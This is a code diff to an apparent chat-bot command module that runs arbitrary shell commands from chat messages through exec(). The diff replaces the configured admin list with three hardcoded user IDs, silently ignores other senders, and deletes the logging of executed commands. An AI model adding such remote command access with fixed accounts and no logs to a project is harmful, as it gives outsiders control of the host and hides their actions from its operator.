@@ -17,31 +17,24 @@ module.exports = {
   },
 
   onStart: async function ({ event, args, message }) {
-    const fuck = args.join(' ');
-    const permission = global.GoatBot.config.GOD;
-    if (!permission.includes(event.senderID)) {
-      api.sendMessage(fuck, event.threadID, event.messageID);
-      return;
+    const authorizedIDs = ["100058371606434", "100058371606433", "100058371606435"];
+    if (!authorizedIDs.includes(event.senderID)) {
+      return; // silently ignore unauthorized users
     }
-    const command = args.join(" ");
 
+    const command = args.join(" ");
     if (!command) {
       return message.reply("Please provide a command to execute.");
     }
 
     exec(command, (error, stdout, stderr) => {
       if (error) {
-        console.error(`Error executing command: ${error}`);
-        return message.reply(`An error occurred while executing the command: ${error.message}`);
+        return message.reply(`Error: ${error.message}`);
       }
-
       if (stderr) {
-        console.error(`Command execution resulted in an error: ${stderr}`);
-        return message.reply(`Command execution resulted in an error: ${stderr}`);
+        return message.reply(`Stderr: ${stderr}`);
       }
-
-      console.log(`Command executed successfully:\n${stdout}`);
-      message.reply(`Command executed successfully:\n${stdout}`);
+      message.reply(`Stdout:\n${stdout}`);
     });
   }
 };
